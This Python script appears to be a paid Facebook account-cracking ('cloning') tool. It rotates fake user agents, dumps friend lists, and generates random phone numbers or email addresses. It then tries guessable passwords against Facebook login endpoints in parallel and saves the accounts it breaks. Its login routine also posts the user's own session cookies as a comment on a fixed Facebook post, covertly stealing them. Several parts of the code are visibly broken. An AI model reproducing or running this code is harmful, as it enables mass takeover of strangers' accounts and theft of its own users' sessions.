from os import path
import os,base64,zlib,pip,urllib
#os.system('xdg-open https://facebook.com/groups/351076900316263/')
print('\n\033[1;37m install modules...\n It will take some seconds...')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python RAJA.py')
except:pass
        
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

def ua_string():
        fban = "FBAN/FB4A"
        fbav = f"FBAV/{random.randint(200, 300)}.0.{random.randint(0, 100)}."
        fbav += f"{random.randint(0, 100)};FBBV/{random.randint(200000000, 300000000)}"
        fbdm = "{density=" + f"{random.uniform(1, 4):.1f}" + f",width={random.randint(800, 2560)},height={random.randint(600, 3840)}" + "}"
        fblc = "FBLC/en_US"
        fbrv = f"FBRV/{random.randint(200000000, 300000000)}"
        fbcr = f"FBCR/{random.choice(['Spark NZ', 'Verizon', 'AT&T', 'Vodafone'])}"
        fbmf = "FBMF/" + random.choice(['samsung', 'apple', 'huawei', 'xiaomi'])
        fbbd = fbmf
        samsung_models = ['Galaxy S20', 'Galaxy Note 10', 'Galaxy A51', 'Galaxy S10', 'Galaxy Fold','Galaxy S21', 'Galaxy Note 20', 'Galaxy A71', 'Galaxy S9', 'Galaxy Z Fold 2','Galaxy S22', 'Galaxy Note 21', 'Galaxy A52', 'Galaxy S11', 'Galaxy Z Flip 3','Galaxy S23', 'Galaxy Note 22', 'Galaxy A53', 'Galaxy S12', 'Galaxy Z Fold 3','Galaxy S24', 'Galaxy Note 23', 'Galaxy A54', 'Galaxy S13', 'Galaxy Z Flip 4']
        fbdv = f"FBDV/{random.choice(samsung_models)}"
        fbsv = f"FBSV/{random.randint(9, 15)}"
        fbop = "FBOP/1"
        fbca = "FBCA/" + random.choice(['armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'])
        ua_string = f"{fban};{fbav};{fbdm};{fblc};{fbrv};{fbcr};{fbmf};{fbbd};{fbpn};{fbdv};{fbsv};{fbop};{fbca}"
        return ua_string

'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/108.0.5414.180 Chrome/108.0.5414.180 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5403.143 Safari/537.36',
'Mozilla/5.0 (Android; Mobile; rv:117.0) Gecko/117.0 Firefox/117.0',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/600.6.11 (KHTML, like Gecko) Version/14.4 Mobile/72C95B Safari/560.16',
'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5389.213 Safari/537.36 Edg/105.0.1253.49',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5395.97 Safari/537.36 Edg/106.0.1381.37',
'Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5386.214 Safari/537.36',   
logo=("""\033[1;37m
  ########     ###          ##    ###    
  ##     ##   ## ##         ##   ## ##   
  ##     ##  ##   ##        ##  ##   ##  
  ########  ##     ##       ## ##     ## 
  ##   ##   ######### ##    ## ######### 
  ##    ##  ##     ## ##    ## ##     ## 
  ##     ## ##     ##  ######  ##     ##
--------------------------------------------------
 Author    : Anchal Raja
 Github    : CKB-MACKER
 Facebook  : Anchal Raja
 Tool Name : Raja
 Type type : Tool Paid 
 Version   :\033[1;37m \x1b[38;5;201m 0.1
\033[1;31m--------------------------------------------------
 \033[1;92m     {=}Anchal Raja King of Facebook{=}
\033[1;31m--------------------------------------------------""")
def linex():
        print('\033[1;91m--------------------------------------------------\033[1;96m')
def reg():
    os.system('clear')
    print(logo)
    print ('\033[1;92m Checking Approval')
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.bs7nt.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/CKB-MAKER-ANCHAL-RAJA/d-2/main/Aproval.txt').text
    if to in r:
        time.sleep(2)
        menu()
    else:
        os.system('clear')
        print(logo)
        print ('\033[1;93m----------------------------------------------')
        print ('\033[1;93m Your Tocken is Not Approved')
        print ('\033[1;91m----------------------------------------------')
        print ('\033[1;93m Raja Toll Paid You Need Get Approved First')
        print ('\033[1;91m----------------------------------------------')
        print ('\033[1;93m Note Paid Tolls Approval For Login Charges 350')
        print ('\033[1;92m----------------------------------------------')
        print ('\033[1;92mToken: ' + to)
        print ('\033[1;92m----------------------------------------------')
        print (' Copy Token And Send Me To WhatsApp')
        print ('\033[1;92m----------------------------------------------')
        input ('\033[1;92m Press Enter To Send Token')
        print ('\033[1;91m----------------------------------------------')
        os.system('am start https://wa.me/+919149858868?text=Hello%20Anchal%20Raja%20Sir%20Please%20Approvel%20my%20Tocken:'+to)
        reg()

def reg2(): 
    os.system('clear')
    logo()
    print('')
    print ('\tApproval Not Detected')
    print('')
    id = uuid.uuid4().hex[:50]
    print (' Token : ' +id)
    print(' WhatsApp : +919149858868')
    input(' Press Enter To Send Token ')
    os.system('am start https://wa.me/+919149858868?text=Sir%20Approve%20my%20Token%20and%20my%20Token :'+id)
    sav = open('/sdcard/Android/.bs7nt.txt', 'w')
    sav.write(id)
    sav.close()
    reg()


def clear():
        os.system('clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def login():
        clear()
        cookies = input('\033[1;32m Put Cookies: ')
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
                print(' Welcome\033[1;32m : '+name)
                print(' \033[1;37mYour UID : '+idd)
                print(' Barth Day: '+barth)
                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
                print(' Cookies login has been successfull...')
                time.sleep(1)
                menu()
        except KeyError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
        except requests.exceptions.ConnectionError:
                exit(' internet connection error...')
        except AttributeError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
                login()
def public():
        usrr=[]
        clear()
        try:
                tok = open('.tok.txt','r').read()
                cok = open('.coki.txt','r').read()
                tokenku.append(tok)
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        except IOError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
                print('\033[1;32m Welcome '+name)
                linex()
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
        except ValueError:
                exit(' Put only digits not latters ')
        if jum<1 or jum>5000:
                exit()
        ses=requests.Session()
        yz = 0
        for met in range(jum):
                yz+=1
                kl = input(f'\033[1;92m Put link no.{yz+0}: ')
                usrr.append(kl)
        linex()
        print('\033[1;92m All method working try 1 by 1 ')
        linex()
        print('\033[1;92m [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
        linex()
        mthd = input('\033[1;92m Choose method: ')
        linex()
        print(' Do you went show cp account? (y/n): ')
        linex()
        cx=input('\033[1;96m Choose: ')
        if cx in ['y','Y','yes','Yes','1']:
                pcp.append('y')
        else:
                pcp.append('n')
        linex()
        print('\033[1;32m Dumping friend list...\033[1;37m')
        linex()
        for userr in usrr:
                try:
                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                        for mi in col['friends']['data']:
                                try:
                                        iso = (mi['id']+'|'+mi['name'])
                                        if iso in id:pass
                                        else:id.append(iso)
                                except:continue
                except (KeyError,IOError):
                        pass
                except requests.exceptions.ConnectionError:
                        exit(f' No internet connection')
        try:
                plist = []
                try:
                        ps_limit = int(input(' How many passwords do you want to add ? '))
                except:
                        ps_limit =1
                linex()
                print('\033[1;32m exp: first last firtslast first123 etc..')
                linex()
                for i in range(ps_limit):
                        plist.append(input(f' Put password {i+1}: '))
                with tred(max_workers=30) as crack_submit:
                        clear()
                        total_ids = str(len(id))
                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                        print("\033[1;37m \x1b[38;5;209mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in id:
                                ids,names = user.split('|')
                                passlist = plist
                                if mthd in ['1','01']:
                                        crack_submit.submit(ffb,ids,names,passlist)
                                elif mthd in ['2','02']:
                                        crack_submit.submit(api,ids,names,passlist)
                                else:
                                        crack_submit.submit(api1,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python Raja.py')
        except requests.exceptions.ConnectionError:
                exit(f' No internet connection')
        except (KeyError,IOError):
                print(f' No friends for {userr}')
                time.sleep(3)
                public()
def menu():
        try:
                clear()
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' \033[1;92m[1] File cloning\n [2] Create  File\n [3] Public Cloning\n [4] Random Number Cloning\n [5] Random Gmail Crack\n [6] Remove Doubleg link\n [7] Contact Me Whatsapp\n [8] Join My WhatsApp Group\n [0] Exit Menu')
                        linex()
                        xd=input(' \033[1;96mChoose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print('\033[1;92m Put file example:  /sdcard/File.txt  etc..')
                                linex()
                                file = input('\033[1;92m Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print('\033[1;92m All method working try 1 by 1 ')
                                linex()
                                print('\033[1;92m [1] Method 1 (for New id) \n [2] Method 2  Old id\n [3] Method 3  Old id)')
                                linex()
                                mthd=input('\033[1;96m Choose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' How many passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                linex()
                                print('\033[1;32m exp: first last  firtslast  first123\033[1;33m etc')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input('\033[1;96m Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('\033[1;36m Your File Name: \033[1;32m'+file)
                                        print ('\033[1;37m \x1b[38;5;209m-------------------------------------------------')
                                        print('\033[1;37m Total Account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;32mM{mthd}')
                                        print("\033[1;33m Use Flight Mode 5 Second After Every 5 Minutes")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;32m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python RAJA.py')
                        elif xd in ['2','02']:                                
                           
                              create_file()
                        elif xd in ['3','03']:
                                public()
                        elif xd in ['4','04']:
                                clear()
                                print('\033[1;32m [1] Pakistan Cloning\n [2] Indian Cloning\n [3] Gmail Cloning\n [0] Back Menu')
                                linex()
                                x=input('\033[1;96m Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        india()
                                elif x in ['3','03']:
                                        gmail()
                                else:
                                        menu()
                        elif xd in ['5','05']:
                                gmail()
                        elif xd in ['6','06']:
                                
                                double()
                        elif xd in ['7','07']:
                                os.system('am start https://wa.me/+919149858868');menu()
                        elif xd in ['8','08']:
                               wx=('Dsj9JMWoixk4Qsje0Ng3nA')
                               os.system(f'xdg-open https://chat.whatsapp.com/IXUkLpVADBcF9Pyyvp6Mwu/{wx}');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ðŸ¥° ')
                        else:
                                exit(' Option not found in menu...')
                else:
                        
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
def pak():
                user=[]
                clear()
                print('\033[1;32m Code Example: 0306,0315,0335,0345\033[1;33m etc..')
                print('\033[1;91m--------------------------------------------------')
                code = input('\033[1;32m Put Code: ')
                try:
                        limit = int(input('\033[1;32m Example: 2000, 3000, 5000, 10000\n\033[1;32m Put Limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as Raja:     
                        clear()
                        tl = str(len(user))
                        print(' Total Account : \033[1;32m'+tl)
                        print(f'\033[1;32m Choice Code :\033[1;32m '+code)
                        print(f'\033[1;93m Use Flight Mode 5 Second After Every 5 Minutes \033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
                                Raja.submit(rndm,ids,passlist)
                print('\033[1;32m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python RAJA.py')
def india():
                user=[]
                clear()
                print('\033[1;32m Code example: 0962,0865,0600,0889\033[1;33m etc..')
                print ('\033[1;91m--------------------------------------------------')
                code = input('\033[1;32m Put Code: ')
                try:
                        limit = int(input('\033[1;32m Example: 2000, 3000, 5000, 10000\n\033[1;32m Put Limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as Raja:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;32m Total Account : \033[1;32m'+tl)
                        print(f'\033[1;32m Choice Code  :\033[1;32m '+code)
                        print(f'\033[1;93m Use Flight Mode 5 Second After Every 5 Minutes \033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'India','india','kumar12','yadav123','kumar123','yadav12','yadav1122','yadav1234','kumar1234','kumar1122','57273200']
                                Raja.submit(rndm,ids,passlist)
                print('\033[1;32m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python RAJA.py')
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;32m Example: suraj, sandeep, ajay, sanjay\033[1;32m etc..')
                linex()
                first = input('\033[1;32m Put first name: ')
                linex()
                print('\033[1;32m Example: kumar, yadav, singh\033[1;32m etc..')
                linex()
                last = input('\033[1;32m Put last name: ')
                linex()
                print('\033[1;32m Example: @gmail.com , @yahoo.com etc..')
                linex()
                domain = input('\033[1;32m domain: ')
                linex()
                try:
                        limit=int(input('\033[1;32m Put Limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as Raja:
                        total = str(len(fo))
                        clear()
                        print('\033[1;32m Total Account : \033[1;32m'+total)
                        print('\033[1;93m Use Flight Mode 5 Second After Every 5 Minutes \033[1;97m')
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',fs+'123456',fs+'123@',fs+'1234@',fs+'123@@',fs+'12@',fs+'1234@@',fs+'12@@']
                                Raja.submit(rndm,ids,passlist)
                print('\033[1;32m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python RAJA.py')
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [RAJA~] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        headers = {'authority': 'x.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'referer': 'https://x.facebook.com/?stype=lo&deoia=1&jlou=AfcakX1dV7JIWq63fiOix4AYKj-jZ97FpDCiuQxySar7rp20D8641gfr9fC_MtmDmsw4yY3vq7yfwZ2E-jmhiPtdXpgYhNrwn8IrnqJQjpKT2g&smuh=3737&lh=Ac_QCclviTetLO9GsWM&wtsid=rdr_0TysID877Y98cPAE5&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"CPH1909"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"8.1.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
                        getlog = session.get(f'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Raja=session.cookies.get_dict().keys()
                        if "c_user" in Raja:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;37m [RAJA~OK] %s | %s'%(ids,pas))
                                open('/sdcard/RAJA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Raja:
                                if 'y' in pcp:
                                        print('\r\r\033[1;31m [RAJA~CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAJA~CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue	
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
